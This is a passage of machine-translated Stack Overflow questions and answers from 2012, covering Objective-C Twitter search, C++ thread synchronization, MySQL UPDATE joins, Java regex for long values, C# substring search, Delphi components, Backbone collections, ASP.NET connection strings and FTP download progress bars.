FROM    tblMyTable
WHERE   ID IN ( SELECT Value FROM fnNTextToIntTable(@MyList) ) 
```

# iphone - 如何在 MGTwitterengine iphone 中使用 twitter 用户搜索 api

> ID：11243194
> 
> 赞同：0
> 
> 时间：2012-06-28T11:01:12.283
> 
> 标签：iphone, mgtwitterengine

我在 iPhone 中使用 MGtwitterengine，我想使用 USER search API [http://api.twitter.com/1/users/search.json?q={username}](http://api.twitter.com/1/users/search.json?q=Monika%20Tapadiya)但我在 MGTwitterengine 中找不到任何方法。如何在 iphone 中使用此 API 来获取用户。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T06:05:42.947

像这样使用：-

```
- (void)searchforTwUser {
    OAToken *access_token = [[OAToken alloc] initWithKey:[tEngine oauthKey] secret:[tEngine oauthSecret]];
    OAConsumer *aconsumer = [[OAConsumer alloc] initWithKey:kOAuthConsumerKey
                            secret:kOAuthConsumerSecret];
    OADataFetcher *fetcher = [[OADataFetcher alloc] init];

    NSString *spaceString=@" ";
    NSCharacterSet * set = [[NSCharacterSet characterSetWithCharactersInString:self.searchName] invertedSet];

    if ([spaceString rangeOfCharacterFromSet:set].location == NSNotFound) 
   {
        NSString *Name = [self.searchName stringByReplacingOccurrencesOfString:@" " withString:@"%20"];
       NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"https://api.twitter.com/1/users/search.json?q=%@",Name]];
       NSLog(@"search name 1 is ..................................... %@",url);
       OAMutableURLRequest *request = [[OAMutableURLRequest alloc] initWithURL:url
                                                                      consumer:aconsumer token:access_token realm:nil
                                                             signatureProvider:nil];
       [request setHTTPMethod:@"GET"];
       [fetcher fetchDataWithRequest:request 
                            delegate:self
                   didFinishSelector:@selector(searchTicket:didFinishWithData:)
                     didFailSelector:@selector(searchTicket:didFailWithError:)];
       [request release];

    }
        else
        {
            NSString *addStr = @"%20";
            NSString *firstCapChar = [[searchName substringToIndex:1] capitalizedString];
            NSString *cappedString = [searchName stringByReplacingCharactersInRange:NSMakeRange(0,1) withString:firstCapChar];
            NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"https://api.twitter.com/1/users/search.json?q=%@%@",cappedString,addStr]];
            NSLog(@"search name 2 is ..................................... %@",url);
            OAMutableURLRequest *request = [[OAMutableURLRequest alloc] initWithURL:url
                                                                           consumer:aconsumer token:access_token realm:nil
                                                                  signatureProvider:nil];
            [request setHTTPMethod:@"GET"];
            [fetcher fetchDataWithRequest:request 
                                 delegate:self
                        didFinishSelector:@selector(searchTicket:didFinishWithData:)
                          didFailSelector:@selector(searchTicket:didFailWithError:)];
            [request release];

        }
    [access_token release];
    [aconsumer release];
}
- (void) searchTicket:(OAServiceTicket *)ticket didFinishWithData:(NSData *)data {

    NSString *response = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    NSDictionary *dict = [response objectFromJSONString];
    NSLog(@"Dict %@",dict);
    [twSearchArray removeAllObjects];
    if (twSearchArray != nil) {
        [twSearchArray release];
        twSearchArray = nil;
    }
    twSearchArray = (NSMutableArray *)dict;
    NSLog(@"Twitter %@",twSearchArray);
    self.twLoaded  = YES;
    [twSearchArray retain];
    [self prepareSearchResults];    
    [response release];
}

- (void) searchTicket:(OAServiceTicket *)ticket didFailWithError:(NSData *)error {

    NSLog(@"Errors is %@",error.description);
} 
```

# c++ - 如何让线程等待对象的销毁

> ID：11243199
> 
> 赞同：2
> 
> 时间：2012-06-28T11:01:29.167
> 
> 标签：c++, synchronization, pthreads, conditional-statements

我想让一个线程等待另一个线程破坏特定对象。我想过以某种方式实现它：

```
class Foo {
private:
    pthread_mutex_t* mutex;
    pthread_cond_t* condition;
public:
    Foo(pthread_mutex_t* _mutex, pthread_cond_t* _condition) : mutex(_mutex), condition(_condition) {}

    void waitForDestruction(void) {
        pthread_mutex_lock(mutex);
        pthread_cond_wait(condition,mutex);
        pthread_mutex_unlock(mutex);
    }

    ~Foo(void) {
        pthread_mutex_lock(mutex);
        pthread_cond_signal(condition);
        pthread_mutex_unlock(mutex);
    }
}; 
```

但是，我知道我必须在 waitForDestruction 方法中处理虚假唤醒，但我不能在“this”上调用任何东西，因为它可能已经被破坏了。

我想到的另一种可能性是不使用条件变量，而是在构造函数中锁定互斥体，在析构函数中解锁它并在 waitForDestruction 方法中锁定/解锁它 - 这应该适用于非递归互斥体，并且 iirc 我可以从没有锁定它的线程中解锁互斥锁，对吗？第二种选择是否会受到任何虚假唤醒的影响？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:08:36.717

这总是一件困难的事情。但是这些代码行怎么样：

```
struct FooSync {

    typedef boost::shared_ptr<FooSync> Ptr;

    FooSync() : owner(boost::this_thread::get_id()) {
    }

    void Wait() {
        assert(boost::this_thread::get_id() != owner);
        mutex.lock();
        mutex.unlock();
    }

    boost::mutex mutex;
    boost::thread::id owner;

};

struct Foo {

    Foo() { }

    ~Foo() {
        for (size_t i = 0; i < waiters.size(); ++i) {
            waiters[i]->mutex.unlock();
        }
    }

    FooSync::Ptr GetSync() {
        waiters.push_back(FooSync::Ptr(new FooSync));
        waiters.back()->mutex.lock();
        return waiters.back();
    }

    std::vector<FooSync::Ptr> waiters;

}; 
```

上面的解决方案将允许单个对象上有任意数量的销毁等待`Foo`对象。只要它会正确管理这些对象占用的内存。似乎没有什么可以阻止`Foo`在堆栈上创建实例。

尽管我看到的唯一缺点是它要求始终在“拥有”`Foo`对象实例的线程中创建销毁等待对象，否则可能会发生递归锁。还有更多，如果`GetSync`从多个线程中调用竞争条件，可能会在`push_back`.

* * *

### 编辑：

好的，我重新考虑了这个问题并提出了**新的解决方案**。看一看：

```
typedef boost::shared_ptr<boost::shared_mutex> MutexPtr;

struct FooSync {

    typedef boost::shared_ptr<FooSync> Ptr;

    FooSync(MutexPtr const& ptr) : mutex(ptr) {
    }

    void Wait() {
        mutex->lock_shared();
        mutex->unlock_shared();
    }

    MutexPtr mutex;

};

struct Foo {

    Foo() : mutex(new boost::shared_mutex) {
        mutex->lock();
    }

    ~Foo() {
        mutex->unlock();
    }

    FooSync::Ptr GetSync() {
        return FooSync::Ptr(new FooSync(mutex));
    }

    MutexPtr mutex;

}; 
```

现在它看起来相当干净，并且更少的代码点受竞争条件的影响。在对象本身和所有同步对象之间只有一个同步原语共享。`Wait`在对象本身所在的线程中调用时，必须采取一些措施来克服这种情况（就像我的第一个示例中一样）。如果目标平台不支持`shared_mutex`，可以使用 good-ol `mutex`。`shared_mutex`当有很多`FooSync`s等待时，似乎可以减轻锁的负担。

# eclipse - 在 Eclipse 中滚动到内容之外或下方

> ID：11243202
> 
> 赞同：0
> 
> 时间：2012-06-28T11:01:38.683
> 
> 标签：eclipse

我希望能够在 Eclipse 中进一步向下滚动，位于文件最后一行内容的下方。许多编辑器/IDE 都支持这一点，例如 IntelliJ 和 TextPad。Vim 如果启用。为了让我正在编写的代码出现在屏幕中间，必须在每个文件的底部放置 20 个空行，这有点烦人。

有什么建议么？

我只在谷歌上找到了一些旧的。而且我不确定它的名字是什么，所以如果你有一个词请告诉我，因为它会帮助我搜索。

**由于目前似乎不可能，我想就如何最好地克服这个问题提出建议。**

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:12:23.327

这是一个已知的限制，并且为此打开了一个错误 - [https://bugs.eclipse.org/bugs/show_bug.cgi?id=362540](https://bugs.eclipse.org/bugs/show_bug.cgi?id=362540)。您可以将您的想法添加到错误中。

# mysql - MySQL：可以在存储过程中的更新中使用内部联接吗？

> ID：11243203
> 
> 赞同：0
> 
> 时间：2012-06-28T11:01:40.800
> 
> 标签：mysql

这是我试图让工作无济于事的代码：

```
CREATE DEFINER=`auser`@`localhost` PROCEDURE `listings_set_image`(
  IN inPropertyId INT, IN inImage VARCHAR(150), IN inCaption(255))
BEGIN
  INNER JOIN    property_images pi
    ON pi.image_id = i.image_id
  UPDATE images i SET i.image_name = inImage, i.image_caption = inCaption 
  WHERE pi.property_id = inPropertyId;
END// 
```

我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:06:23.840

您的[`UPDATE`](http://dev.mysql.com/doc/en/update.html)语法不正确；联接应构成以下内容的一部分***`table_references`***：

```
UPDATE images i JOIN property_images pi USING (image_id)
SET    i.image_name = inImage, i.image_caption = inCaption
WHERE  pi.property_id = inPropertyId; 
```

# java - 如何匹配长与 Java 正则表达式？

> ID：11243204
> 
> 赞同：8
> 
> 时间：2012-06-28T11:01:42.647
> 
> 标签：java, regex, parsing

我知道我可以匹配数字`Pattern.compile("\\d*");`

但它不处理长的最小值/最大值。

对于与异常相关的性能问题，我不想尝试解析 long，除非它真的很长。

```
if ( LONG_PATTERN.matcher(timestampStr).matches() ) {
    long timeStamp = Long.parseLong(timestampStr);
    return new Date(timeStamp);
} else {
    LOGGER.error("Can't convert " + timestampStr + " to a Date because it is not a timestamp! -> ");
    return null;
} 
```

我的意思是我不想要任何 try/catch 块，并且我不希望长时间引发异常，例如“564654954654464654654567879865132154778”，它超出了常规 Java long 的大小。

有人有一种模式来处理这种对原始 java 类型的需求吗？JDK是否提供了自动处理它的东西？Java中是否有故障安全解析机制？

谢谢

* * *

**编辑：**请假设“坏长字符串”不是例外情况。我不是要一个基准，我来这里是为了一个代表 long 的正则表达式，仅此而已。我知道正则表达式检查所需的额外时间，但至少我的长解析将始终保持不变，并且永远不会依赖于“坏长字符串”的百分比

我找不到链接了，但是 StackOverflow 上有一个很好的解析基准，它清楚地表明重用 sams 编译的正则表达式非常快，比抛出异常快很多，因此只有很小的异常阈值会使系统变慢比附加的正则表达式检查。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-28T11:06:35.370

a 的最小值`long`为`-9,223,372,036,854,775,808`，最大值为`9,223,372,036,854,775,807`。因此，最多 19 位数字。所以，`\d{1,19}`应该让你到达那里，也许有一个可选的`-`, 和`^`匹配`$`字符串的末端。

*大致*如此：

```
Pattern LONG_PATTERN = Pattern.compile("^-?\\d{1,19}$"); 
```

...或类似的东西，并假设您不允许逗号（或已经删除它们）。

正如 gexicide 在评论中指出的那样，上面允许一个小的（相比之下）无效值范围，例如`9,999,999,999,999,999,999`. 您可以使用您的正则表达式变得更复杂，或者只是接受上述内容将清除绝大多数无效数字，因此您可以减少您获得的解析异常的数量。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-12-13T10:06:33.117

这个正则表达式应该做你需要的：

`^(-9223372036854775808|0)$|^((-?)((?!0)\d{1,18}|[1-8]\d{18}|9[0-1]\d{17}|92[0-1]\d{16}|922[0-2]\d{15}|9223[0-2]\d{14}|92233[0-6]\d{13}|922337[0-1]\d{12}|92233720[0-2]\d{10}|922337203[0-5]\d{9}|9223372036[0-7]\d{8}|92233720368[0-4]\d{7}|922337203685[0-3]\d{6}|9223372036854[0-6]\d{5}|92233720368547[0-6]\d{4}|922337203685477[0-4]\d{3}|9223372036854775[0-7]\d{2}|922337203685477580[0-7]))$`

但是这个正则表达式不会验证额外的符号，比如,`+`等等。如果你需要验证所有可能的 Long 值，你需要升级这个正则表达式。`L``_`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T11:05:26.760

只需捕获 NumberFormatException，除非这种情况经常发生。

另一种方法是使用只允许长文字的模式。这种模式可能相当复杂。

第三种方法是首先将数字解析为 BigInt。然后你可以将它与 Long.MAX_VALUE 和 Long.MIN_VALUE 进行比较，以检查它是否在 long 的范围内。然而，这也可能代价高昂。

*另请注意：解析 long 非常快，这是一种非常优化的方法（例如，尝试在一个步骤中解析两个数字）。应用模式匹配可能比执行解析成本更高。解析过程中唯一缓慢的是抛出 NumberFormatException。因此，如果异常情况不经常发生，那么简单地捕获异常是最好的方法*

# c# - 应用程序错误：无法加载文件或程序集

> ID：11243205
> 
> 赞同：0
> 
> 时间：2012-06-28T11:01:43.147
> 
> 标签：c#, asp.net, web-config, configuration-files, config

我在.net 上工作，当我运行我的应用程序时，我收到了这个错误。谁能帮我？

```
Application Error -
MESSAGE: Could not load file or assembly 'ConfigurationMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The system cannot find the file specified.
SOURCE: BusinessLayer
TARGETSITE: Void .ctor()
STACKTRACE:
  at BusinessLayer.BL..ctor()
  at Marketing_BulkSMS..ctor()
  at ASP.marketing_bulksms_aspx..ctor()
  at __ASP.FastObjectFactory_app_web_q3yaaskd.Create_ASP_marketing_bulksms_aspx()
  at System.Web.Compilation.BuildResultCompiledType.CreateInstance()
  at System.Web.Compilation.BuildManager.CreateInstanceFromVirtualPath(VirtualPath virtualPath, Type requiredBaseType, HttpContext context, Boolean allowCrossApp, Boolean noAssert)
  at System.Web.UI.PageHandlerFactory.GetHandlerHelper(HttpContext context, String requestType, VirtualPath virtualPath, String physicalPath)
  at System.Web.UI.PageHandlerFactory.System.Web.IHttpHandlerFactory2.GetHandler(HttpContext context, String requestType, VirtualPath virtualPath, String physicalPath)
  at System.Web.HttpApplication.MapHttpHandler(HttpContext context, String requestType, VirtualPath path, String pathTranslated, Boolean useAppConfig) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T02:18:02.493

您的 bin 文件夹中缺少 ConfigurationMgr.dll 文件，或者 bin 文件夹中的 ConfigurationMgr.dll 与 Web.config 中指定的版本不同。

# c# - 在 C# 中查找匹配的单词

> ID：11243207
> 
> 赞同：3
> 
> 时间：2012-06-28T11:01:48.070
> 
> 标签：c#, .net, string, for-loop

我面临解决这个问题的问题。例如，我有一个字符串变量

```
 string text="ABCD,ABCDABCD,ADCDS"; 
```

我需要在上面的字符串中搜索像“BC”这样的字符串值，并找到“BC”出现的位置。即，如果我们在该字符串变量中搜索“BC”，它将输出为 1,6

```
 0   1   2   3  4    5   6   7   8   9   10  11 12   13
            -------------------------------------------------------
            | A | B | C | D | , | A | B | C | D | , | A | D | C | S |
            ------------------------------------------------------- 
```

问题是我们不能使用内置的字符串类方法`contains()`，`lastIndexOf()`. 谁能帮我做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:33:30.180

> 问题是我们不能使用内置的字符串类方法'contains()'、'lastIndexOf()'。谁能帮我做到这一点？

然后你可以建立你自己的。我认为这甚至`Substring`是被禁止的。

```
string text="ABCD,ABCDABCD,ADCDS";
string whatToFind = "BC";

List<int> result = new List<int>();
for(int index=0; index < text.Length; index++)
{
    if(index + whatToFind.Length > text.Length)
        break;
    bool matches = true;
    for(int index2=0; index2<whatToFind.Length; index2++)
    {
        matches = text[index+index2] == whatToFind[index2];
        if(!matches)
            break;
    }
    if(matches)
        result.Add(index);
} 
```

这是运行代码：http: [//ideone.com/s7ej3](http://ideone.com/s7ej3)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T12:21:22.313

下面是一个满足您要求的完美示例，但也很好而且很慢，而且内存占用也很大：

```
string text = "ABCD,ABCDABCD,ADCDS";
string whatToFind = "BC";

string delim = "";    

for(int index=0; index < text.Length; index++)
{
    if(index + whatToFind.Length > text.Length)
        break;

    if(text.SubString(index, whatToFind.Length) == whatToFind)
    {
        Console.Out.WriteLine(delim + index.ToString())
        delim = ",";
    }
} 
```

我把它留给读者作为练习，以提高性能和内存使用。了解速度慢的地方和原因比获得更快的答案更有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:08:44.920

这应该适合你：

```
string text="ABCD,ABCDABCD,ADCDS";
var seekindex = 0;
var positions = new List<int>();
while( seekindex < text.Length ){
  var index = text.IndexOf( "BC", seekindex);
  if( index > -1){
    positions.Add(index);
    seekindex = index + 1;
  }else{
    break;
  }
} 
```

这使用`IndexOf`带有 startindex 的方法来确保我们下次继续从之前的命中位置搜索，直到`IndexOf`返回 -1 指示不再有命中。

`positions`最后将包含索引，结果实际上是 1,6,10 而不是 1,6 ;)

**编辑**

才意识到自己不能用`IndexOf`。再试一次:)

```
string text="ABCD,ABCDABCD,ADCDS";
var positions = new List<int>();
for( int i = 0; i < text.Length-1; i++ ){
  if( text[i] == 'B' && text[i+1] == 'C' ){
    positions.Add(i);
  }
} 
```

这似乎是一个性能问题，因为 if 语句同时检查当前字符和下一个字符，因此检查所有字符两次。

但实际上不会。由于两者之间的 AND (&&)，如果`text[i]`不是 B，它不会执行第二次检查，因为它知道 if 无论如何都会失败。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T11:08:54.697

```
string text = "ABCD,ABCDABCD,ADCDS";
            int location;
            for (int i = 0; i < text.Length; i++)
                if (text[i] == 'B')
                    if (text[i + 1] == 'C')
                    {
                        location = i;
                        i++;
                    } 
```

**编辑：**

```
List<int> locations = new List<int>();
string text = "ABCD,ABCDABCD,ADCDS";
                for (int i = 0; i < text.Length; i++)
                    if (text[i] == 'B')
                        if (text[i + 1] == 'C')
                        {
                            location.Add(i);
                            i++;
                        } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-28T11:09:27.780

可能你不能在作业中使用正则表达式。最好的解决方案是将您的字符串视为 char 数组。阅读[http://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string_search_algorithm](http://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string_search_algorithm)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-28T11:17:34.283

滚动您自己的版本`IndexOf`并不难（根据您已经收到的答案），并且由于它是家庭作业，您可能可以侥幸逃脱。

但是，正如您可能想象的那样，简单的`for`循环并不是最有效的方法。字符串搜索是一个重要的话题，尽管您可能不再需要在家庭作业之外实现它，但您可以[阅读它](http://en.wikipedia.org/wiki/String_searching_algorithm)以供您自己启迪。

# delphi - delphi 创建组件模板

> ID：11243208
> 
> 赞同：1
> 
> 时间：2012-06-28T11:01:47.937
> 
> 标签：delphi, delphi-7, rtti

我正在使用 Delphi 应用程序。我创建了一个如下所示的表单：

![在此处输入图像描述](../Images/783d435f919822544fbde0a6c580c526.png)

我想通过**代码**从这个控件中制作组件。但不是通过**component-->create component Template** -->等等。

我如何通过**delphi代码使****组件模板**脱离表单控件。？？提前谢谢。

 *** * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T20:44:47.023

或者，如果您想将该组控件作为一个单独的组件，您可以将这样的单元安装到某个包中：

```
unit EditGroup;

interface

uses
  SysUtils, Classes, Graphics, Controls, StdCtrls;

type
  TEditGroup = class(TCustomControl)
  private
    FButton: TButton;
    FFirstEdit: TEdit;
    FFirstLabel: TLabel;
    FSecondEdit: TEdit;
    FSecondLabel: TLabel;
  protected
    procedure Paint; override;
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
  published
    property Button: TButton read FButton;
    property FirstEdit: TEdit read FFirstEdit;
    property FirstLabel: TLabel read FFirstLabel;
    property SecondEdit: TEdit read FSecondEdit;
    property SecondLabel: TLabel read FSecondLabel;
  end;

procedure Register;

implementation

{ TEditGroup }

constructor TEditGroup.Create(AOwner: TComponent);
begin
  inherited;

  Width := 213;
  Height := 104;
  Color := clWhite;

  FFirstLabel := TLabel.Create(Self);
  FFirstLabel.SetSubComponent(True);
  FFirstLabel.Parent := Self;
  FFirstLabel.Top := 11;
  FFirstLabel.Left := 8;
  FFirstLabel.Name := 'FirstLabel';

  FFirstEdit := TEdit.Create(Self);
  FFirstEdit.SetSubComponent(True);
  FFirstEdit.Parent := Self;
  FFirstEdit.Top := 8;
  FFirstEdit.Left := 84;
  FFirstEdit.Width := 121;
  FFirstEdit.Name := 'FirstEdit';

  FSecondLabel := TLabel.Create(Self);
  FSecondLabel.SetSubComponent(True);
  FSecondLabel.Parent := Self;
  FSecondLabel.Top := 39;
  FSecondLabel.Left := 8;
  FSecondLabel.Name := 'SecondLabel';

  FSecondEdit := TEdit.Create(Self);
  FSecondEdit.SetSubComponent(True);
  FSecondEdit.Parent := Self;
  FSecondEdit.Top := 36;
  FSecondEdit.Left := 84;
  FSecondEdit.Width := 121;
  FSecondEdit.Name := 'SecondEdit';

  FButton := TButton.Create(Self);
  FButton.SetSubComponent(True);
  FButton.Parent := Self;
  FButton.Top := 71;
  FButton.Left := 69;
  FButton.Width := 75;
  FButton.Name := 'Button';
end;

destructor TEditGroup.Destroy;
begin
  FButton.Free;
  FFirstEdit.Free;
  FFirstLabel.Free;
  FSecondEdit.Free;
  FSecondLabel.Free;
  inherited;
end;

procedure TEditGroup.Paint;
begin
  Canvas.Rectangle(ClientRect);
end;

procedure Register;
begin
  RegisterComponents('Stack Overflow', [TEditGroup]);
end;

end. 
```

以下是它在设计时的样子：

![在此处输入图像描述](../Images/50fa3a17dde2799ed425b8c4c88cb782.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T20:25:14.200

如果您右键单击表单并选择*View as Text*，那么您已经走了很长一段路。只需用 ' 替换所有`=`' `:=`，然后通过添加 . 来创建所有组件`.Create(Self)`。

所以这段文字：

```
object Form1: TForm1
  Left = 300
  Top = 281
  Width = 630
  Height = 372
  Caption = 'Form1'
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  PixelsPerInch = 96
  TextHeight = 13
  object Label1: TLabel
    Left = 14
    Top = 28
    Width = 32
    Height = 13
    Caption = 'Label1'
  end
  object Edit1: TEdit
    Left = 63
    Top = 24
    Width = 121
    Height = 21
    TabOrder = 0
    Text = 'Edit1'
  end
end 
```

应该转换成类似的东西：

```
type
  TMyForm1 = class(TForm)
  private
    Label1: TLabel;
    Edit1: TEdit;
  public
    constructor Create(AOwner: TComponent); override;
  end;

constructor TMyForm1.Create(AOwner: TComponent);
begin
  inherited Create(AOwner);
  Width := 630;
  Height := 372;
  Caption := 'Form1';
  Color := clBtnFace;
  ...
  Label1 := TLabel.Create(Self);
  with Label1 do
  begin
    Left := 14;
    Top := 28;
    Width := 32;
    Height := 13;
    Caption := 'Label1';
  end;
  Edit1 := TEdit.Create(Self);
  with Edit1 do
  ...
end; 
```

但也有用于此特殊任务的工具，请参阅[是否有任何 Delphi DFM 到 Delphi 源代码转换工具？](https://stackoverflow.com/q/7332592/757830).**

# java - soap：prolog 中不允许有内容；@-符号; 糖CRM

> ID：11243211
> 
> 赞同：0
> 
> 时间：2012-06-28T11:02:05.467
> 
> 标签：java, soap, sugarcrm

我的肥皂连接到糖 crm 时出现问题：一切正常，直到我想传输 @-sign，然后我得到这个异常。

```
AxisFault
 faultCode: {http://schemas.xmlsoap.org/soap/envelope/}Server.userException
 faultSubcode: 
 faultString: org.xml.sax.SAXParseException: Content is not allowed in prolog.
 faultActor: 
 faultNode: 
 faultDetail: 
    {http://xml.apache.org/axis/}stackTrace:org.xml.sax.SAXParseException: Content is not allowed in prolog. 
```

我能做些什么来解决我的问题？

谢谢弗洛

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T09:29:11.537

问题已解决 :) 处理 @-sign 的查询出现问题。

# backbone.js - 模型应该知道它的集合吗？

> ID：11243214
> 
> 赞同：1
> 
> 时间：2012-06-28T11:02:13.873
> 
> 标签：backbone.js

一个集合知道它的模型，但是有没有办法让模型进入它的集合？

我需要一种方法来访问集合中的“相邻”模型。以下可能会更好地了解问题：

我正在尝试实现一个简单的应用程序，该应用程序根据模型中的“优先级”属性对项目进行排名并维护它们的列表。每个模型视图都有用于增加或减少优先级的按钮，这应该相应地改变列表的顺序。只要优先级属性是连续的，只需从当前值中加或减 1 即可，例如：

```
1,2,3,4,5,6 
```

但也有一个删除按钮，允许从列表中删除任何模型。它可以导致优先级属性，例如：

```
1,2,5,6 
```

现在将优先级 5 更改为 4 不会改变列表的顺序，因为它仍然大于 2。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:58:07.687

它没有记录，但模型将自动具有`collection`指向集合的属性。如果一个模型在多个集合中，我不知道它是如何工作的细节（也许`collection`属性一旦设置就不会改变）。

要解决您提到的特定问题，您可以侦听`remove`集合上的事件并相应地进行调整。在这种情况下，您甚至不需要该`collection`属性，因为模型和集合都将传递给`remove`侦听器。

```
var handler = function ( model, collection, options ) {

  // ...

};

collection.on( 'remove', handler ); 
```

[Backbone.Collection 文档](http://backbonejs.org/#Collection-remove)也这样说：

> 从集合中删除模型的索引可用作`options.index`

listeners的`options`参数没有记录在[记录](http://backbonejs.org/#FAQ-events)listeners`remove`签名的地方，但它被传递了（无论如何在 0.9.2 中）。`remove`

# asp.net - 指定要在 Web.Config 中使用的活动连接字符串

> ID：11243215
> 
> 赞同：2
> 
> 时间：2012-06-28T11:02:16.760
> 
> 标签：asp.net, web-config, connection-string

是否有一种快速简便的方法可以将 Web.Config 中的连接字符串设置为活动连接字符串？

我基本上想适当地命名我的连接字符串，然后将一个设置为活动，而不必切换名称或重新编译我的应用程序。

像这样的东西：

```
<add name="Current" connectionString="{Local}"/>

<add name="Local" connectionString=[...]" />
<add name="RemoteOnMyServer" connectionString=[...]" />
<add name="RemoteAzure" connectionString=[...]" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:45:56.943

我不认为这可能是你问的方式。但是您可以将连接字符串块移动到单独的文件中，然后控制哪个文件是活动文件：

```
<connectionStrings configSource="LocalDb.config"/> 
```

然后你可以有单独的配置文件：

```
LocalDb.config
RemoteOnMyServer.config
RemoteAzure.config
<etc> 
```

每个人都会有这样的东西：

```
<?xml version="1.0"?>
<connectionStrings>
    <add name="namedConnectionString" connectionString="Data Source=..." providerName="..." />
</connectionStrings> 
```

`configSource`然后在它们之间切换就变成了改变`<connectionStrings />`元素的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T12:58:00.360

Scott Hanselman 有一篇很好的文章，描述了使用编译器中的构建设置为不同的环境使用不同的配置。我在一些项目中成功地使用了它。

[看一看](http://www.hanselman.com/blog/ManagingMultipleConfigurationFileEnvironmentsWithPreBuildEvents.aspx)

# java - 从 FTP 服务器下载文件时如何显示 JProgressBar

> ID：11243217
> 
> 赞同：3
> 
> 时间：2012-06-28T11:02:21.523
> 
> 标签：java, ftp, jprogressbar

我正在使用 apache commons-net 从 FTP 服务器下载文件。这么多工作正常。我遇到问题的部分是使用`JProgressBar`.

以下代码演示了我如何下载所需的文件：

```
public void download() {
    try {
        FTPClient ftpClient = new FTPClient();

        String fileName = "OFMEX_MANUFACTURING.jar";

        ftpClient.connect("192.168.1.242");
        int replyCode = ftpClient.getReplyCode();

        if (!FTPReply.isPositiveCompletion(replyCode)) {
            JOptionPane.showMessageDialog(null, "Server Down");
        }

        boolean login = ftpClient.login("bioftp", "bioftp");

        boolean changeWorkingDirectory = ftpClient.changeWorkingDirectory("ofmex\\Linux\\");
        boolean setFileType = ftpClient.setFileType(FTP.BINARY_FILE_TYPE);

        ftpClient.enterLocalPassiveMode();

        OutputStream data = (OutputStream) new FileOutputStream(fileName);

        ftpClient.retrieveFile(fileName, data);
        ftpClient.abort();               
    } catch (Exception e) {
        e.printStackTrace();
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:19:25.743

您应该能够使用[CopyStreamListener](http://commons.apache.org/net/api-3.1/org/apache/commons/net/io/CopyStreamListener.html)。请注意，不使用*bytesTransferred(CopyStreamEvent event)*方法，但应该使用*bytesTransferred(long totalBytesTransferred, int bytesTransferred, long streamSize)*。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:27:18.750

如果您要`retriveFile()`直接调用，那么您可能无法知道传输了多少字节。相反，您可以逐字节检索文件并记录传输的每个字节的计数。您还可以获取要传输的总字节数，以便计算要在进度条中显示的百分比。

```
InputStream stSource = new FileInputStream(locFile);
OutputStream stDest = new BufferedOutputStream(ftp.storeFileStream(remFile), ftp.getBufferSize());

Util.copyStream(stSource, stDest, ftp.getBufferSize(),CopyStreamEvent.UNKNOWN_STREAM_SIZE, new CopyStreamAdapter() {
    public void bytesTransferred(long totalBytesTransferred,int bytesTransferred, long streamSize) {
        long megsTotal = 0;
        long megs = totalBytesTransferred / 1048576;

        for (long l = megsTotal; l < megs; l++) {
            System.err.print("|");
        }

        megsTotal = megs;
    }
}); 
```

请参阅上面代码中使用的[这个](http://commons.apache.org/net/api-3.1/org/apache/commons/net/io/Util.html)apache commons util。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:30:52.290

在 NetBeans 中创建一个桌面应用程序。它为您提供了一个带有任务监视器和忙碌图标以及您需要的一切的预建进度条。使用 CopyStreamListener 并使用 bytesTransferred 方法来管理进度条。

# android - Android：不同分辨率屏幕中按钮的位置

> ID：11243221
> 
> 赞同：2
> 
> 时间：2012-06-28T11:02:49.943
> 
> 标签：android

我的 Android 应用程序由几个 UI 屏幕组成，这些屏幕包含背景资源和放置在其顶部的按钮。背景顶部按钮的位置在布局的 xml 文件中确定。在具有不同分辨率的屏幕中，背景会调整大小以适应屏幕。这会产生一个问题，即按钮未放置在背景顶部的正确位置。例如：使用模拟器，我在各种正常尺寸的屏幕上进行了检查。我使用的背景与密度为 240 的 480x800 分辨率兼容。但是当我在分辨率为 640X960 且密度为 320 的模拟器上运行它时，背景会调整大小并且按钮未放置在正确的位置。同样的事情发生在分辨率为 320X480、密度为 160 的模拟器上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:37:32.170

考虑不要将图片调整为总大小，而是将其设置为定义的大小。所以你的图片周围会有一个黑框，但不同的屏幕尺寸没有问题。

# vb.net - 通过注册表免费试用

> ID：11243222
> 
> 赞同：0
> 
> 时间：2012-06-28T11:02:50.707
> 
> 标签：vb.net, registry, trialware

对于我的 VB.NET 应用程序，我希望用户可以免费试用 x 天。

